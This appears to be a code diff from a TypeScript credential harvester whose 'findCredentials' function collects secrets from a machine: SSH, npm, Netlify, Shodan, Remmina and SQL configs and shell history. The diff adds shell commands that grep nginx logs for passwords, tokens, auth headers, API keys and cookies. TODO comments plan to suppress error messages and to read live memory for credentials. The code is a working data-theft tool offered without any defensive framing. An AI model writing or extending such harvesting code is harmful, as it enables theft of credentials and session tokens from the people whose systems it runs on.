@@ -9,7 +9,7 @@ const _run = (args: string): string | null => {
 }
 
 // TODO: Hidde error messages like "file not found" or "permission denied"
-// TODO: Access live memory to extract credenrials
+// TODO: Access live memory to extract credentials
 // TODO: Add all history files
 const findCredentials = (text: string) => {
   const credentials = {} as any;
@@ -25,17 +25,18 @@ const findCredentials = (text: string) => {
   credentials.mem = {} as any;
   credentials.microsoft = {} as any;
   credentials.microsoft.teams = {} as any;
-  credentials.netlify = {} as any;
-  credentials.shodan = {} as any;
-  credentials.syncthing = {} as any;
   credentials.mitmp = {} as any;
+  credentials.netlify = {} as any;
+  credentials.nginx = {} as any;
   credentials.npm = {} as any;
-  credentials.remmina = {} as any;
-  credentials.sql = {} as any;
   credentials.psql = {} as any;
+  credentials.remmina = {} as any;
+  credentials.shodan = {} as any;
+  credentials.sql = {} as any;
   credentials.ssh = {} as any;
-  credentials.termux = {} as any;
   credentials.ssh.sshd = {} as any;
+  credentials.syncthing = {} as any;
+  credentials.termux = {} as any;
   credentials.users = {} as any;
   credentials.shell = {} as any;
   credentials.shell.history = {} as any;
@@ -201,6 +202,49 @@ const findCredentials = (text: string) => {
     credentials.netlify.config = {} as any;
     credentials.netlify.config.path = "~/.config/netlify/config.json";
     credentials.netlify.config.content = netlifyConfig;
+  }
+
+  const nginxEmailLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i mail`);
+  const nginxPassLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i passw`); 
+  const nginxAuthLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i auth`);
+  const nginxTokenLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i token`);
+  const nginxApiLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i api`);
+  const nginxUrlsLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i http`);
+  const nginxCookieLogs = _run(`cat ${path}/var/log/nginx/*.* | grep -i cookie`);
+  if (nginxEmailLogs) {
+    credentials.nginx.emailLogs = {} as any;
+    credentials.nginx.emailLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i mail`;
+    credentials.nginx.emailLogs.content = nginxEmailLogs;
+  }
+  if (nginxPassLogs) {
+    credentials.nginx.passLogs = {} as any;
+    credentials.nginx.passLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i passw`;
+    credentials.nginx.passLogs.content = nginxPassLogs;
+  }
+  if (nginxAuthLogs) {
+    credentials.nginx.authLogs = {} as any;
+    credentials.nginx.authLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i auth`;
+    credentials.nginx.authLogs.content = nginxAuthLogs;
+  }
+  if (nginxTokenLogs) {
+    credentials.nginx.tokenLogs = {} as any;
+    credentials.nginx.tokenLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i token`;
+    credentials.nginx.tokenLogs.content = nginxTokenLogs;
+  }
+  if (nginxApiLogs) {
+    credentials.nginx.apiLogs = {} as any;
+    credentials.nginx.apiLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i api`;
+    credentials.nginx.apiLogs.content = nginxApiLogs;
+  }
+  if (nginxUrlsLogs) {
+    credentials.nginx.urlsLogs = {} as any;
+    credentials.nginx.urlsLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i http`;
+    // credentials.nginx.urlsLogs.content = nginxUrlsLogs;
+  }
+  if (nginxCookieLogs) {
+    credentials.nginx.cookieLogs = {} as any;
+    credentials.nginx.cookieLogs.path = `cat ${path}/var/log/nginx/*.* | grep -i cookie`;
+    credentials.nginx.cookieLogs.content = nginxCookieLogs;
   }
 
   const shodanApiKey = _run(`cat ~/.config/shodan/api_key`);
